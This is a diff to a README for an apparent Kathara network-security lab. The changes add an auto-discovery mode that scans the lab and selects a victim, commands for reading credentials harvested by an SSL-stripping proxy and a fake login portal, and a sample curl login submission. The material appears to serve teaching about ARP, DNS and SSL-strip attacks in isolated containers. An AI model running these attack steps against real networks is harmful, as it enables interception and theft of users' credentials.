@@ -45,7 +45,15 @@ cd /
 
 ## Running the Full Attack
 
-The `exploit.py` orchestrator requires `--dns` (upstream DNS server) for full operation. You must provide `--dns` so the DNS forwarder can handle non-target queries and preserve victim internet connectivity.
+### Automatic Discovery (Recommended)
+
+This mode scans the lab network, classifies hosts, and lets you select the victim and spoofed domain interactively.
+
+```bash
+python3 exploit.py --auto-discover
+```
+
+In manual mode, the `exploit.py` orchestrator requires `--dns` (upstream DNS server) so the DNS forwarder can handle non-target queries and preserve victim internet connectivity. Auto-discover mode selects the DNS server automatically.
 
 ### Lab-Specific Command (required)
 
@@ -109,6 +117,31 @@ curl http://web1.mylab.test/
 curl google.com
 ```
 
+### Verify Credential Capture (Web Portal)
+
+1. Visit `http://web1.mylab.test/` from the victim.
+2. Submit the login form.
+3. Check captures on web1:
+
+```bash
+kathara connect web1
+cat /tmp/captured_credentials.log
+```
+
+4. Check captures on attacker (SSL strip logger):
+
+```bash
+cat /tmp/ssl_strip_credentials.log
+```
+
+5. Optional: submit a login via curl from the victim:
+
+```bash
+curl -i -X POST http://web1.mylab.test/login.php \
+    -d "username=alice&password=SuperSecret123" \
+    -H "Content-Type: application/x-www-form-urlencoded"
+```
+
 ### Check ARP Poisoning
 
 ```bash
@@ -144,6 +177,7 @@ python3 dns_spoofing.py \
 ```bash
 python3 ssl_strip.py \
     --upstream-host web1.mylab.test \
+    --upstream-ip 10.0.0.1 \
     --target-ip 10.0.0.3
 ```
 
@@ -185,8 +219,10 @@ The attacker container automatically installs:
 3. **SSL Stripping**:
    - Intercepts HTTP (port 80) traffic via iptables REDIRECT to port 8080
    - Only intercepts traffic destined for 10.0.0.3 (prevents breaking other sites)
-   - Proxies requests to HTTPS upstream
+    - Proxies requests to HTTPS upstream (10.0.0.1) to bypass DNS spoofing
    - Downgrades responses to HTTP
+    - Intercepts HTTPS redirects and serves content over HTTP
+    - Logs captured credentials to `/tmp/ssl_strip_credentials.log`
 
 ## Troubleshooting
 
@@ -216,13 +252,12 @@ This stops and removes all lab containers.
 
 ## Files in This Directory
 
-- `exploit.py` - Main orchestrator script
-- `arp_poisoning.py` - ARP cache poisoning module
-- `dns_spoofing.py` - DNS forwarder module
-- `ssl_strip.py` - SSL stripping module
+- `attacker/` - Attack toolkit modules (exploit, discovery, ARP/DNS/SSL strip)
 - `attacker.startup` - Kathara startup script (auto-installs dependencies)
 - `*.startup` - Startup scripts for other containers
 - `lab.conf` - Kathara network configuration
+- `web1/monitor_captures.sh` - Live tail of captured credentials on web1
+- `web1/var/www/html/` - HTTPS login portal and PHP capture handlers
 
 ## Need Help?
 
